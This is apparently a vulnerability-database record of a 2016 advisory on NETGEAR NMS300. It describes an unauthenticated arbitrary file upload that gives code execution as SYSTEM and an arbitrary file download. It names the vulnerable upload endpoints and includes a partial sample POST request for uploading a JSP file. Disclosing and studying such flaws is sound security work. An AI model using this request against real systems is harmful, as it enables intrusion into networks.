{
    "text": "vul_name : Netgear Pro NMS 300 Code Execution / File Download ， vul_cve : CVE-2016-1525 , CVE-2016-1524 ， vul_poc : Remote code execution / arbitrary file download in NETGEAR ProSafe Network Management System NMS300 ， Discovered by Pedro Ribeiro ( pedrib @ gmail.com )  , Agile Information Security (  ， Disclosure : 04/02/2016 / Last updated : 04/02/2016 ， Background on the affected product :  ， \"NMS300 ， ProSAFE? Network Management System ， Diagnose , control , and optimize your network devices. ， The NETGEAR Management System NMS300 delivers insight into network elements , including third-party devices. An intuitive , web-based user interface makes it easier to monitor and administer an entire network.\" ， Summary :  ， Netgear's NMS300 is a network management utility that runs on Windows systems. It has serious two vulnerabilities that can be exploited by a remote attacker. The first one is an arbitrary file upload vulnerability that allows an unauthenticated attacker to execute Java code as the SYSTEM user. ， The second vulnerability is an arbitrary file download that allows an authenticated user to download any file from the host that is running NMS300. ， A special thanks to Joel Land of CERT/CC for helping disclose this vulnerability under ID 777024 [ 1 ] . Two new Metasploit modules that exploit these vulnerabilities have been released. ， Technical details :  ，  # 1 ， Vulnerability : Remote code execution via arbitrary file upload ( unauthenticated )  ， CVE-2016-1525 ， Affected versions :  ， NMS300 1.5.0.11 ， NMS300 1.5.0.2 ， NMS300 1.4.0.17 ， NMS300 1.1.0.13 ， There are two servlets that allow unauthenticated file uploads :  ，  @ RequestMapping ( { \"/fileUpload.do\" } )  ， public class FileUpload2Controller ， - Uses spring file upload ，  @ RequestMapping ( { \"/lib-1.0/external/flash/fileUpload.do\" } )  ， public class FileUploadController ， - Uses flash upload ， The JSP file can be uploaded as shown below , it will be named null [ name ] . [ extension ] and can be reached on ， So for example if [ name ] = \"testing\" and [ extension ] = \".jsp\" , the final file will be named \"nulltesting.jsp\". [ name ] and [ extension ] can be seen in the sample request below. The code will execute as the SYSTEM user. ， POST /lib-1.0/external/flash/fileUpload.do HTTP/1.1 ， Content-Type : multipart/form-data ; boundary=-ae0KM7Ef1ei4GI3gL6gL6gL6gL6GI3 ， -ae0KM7Ef1ei4GI3gL6gL6gL6gL6GI3 ， Content-Disposition : form-data ; name=\"name\" ，  [ name ]  ， -ae0KM7Ef1ei4GI3gL6gL6gL6gL6GI3 ， Content-Disposition : form-data ; name=\"Filedata\" ; filename=\"whatever. [ extension ] \" ， Content-Type : application/octet-stream",
    "time": "2016.02.07"
}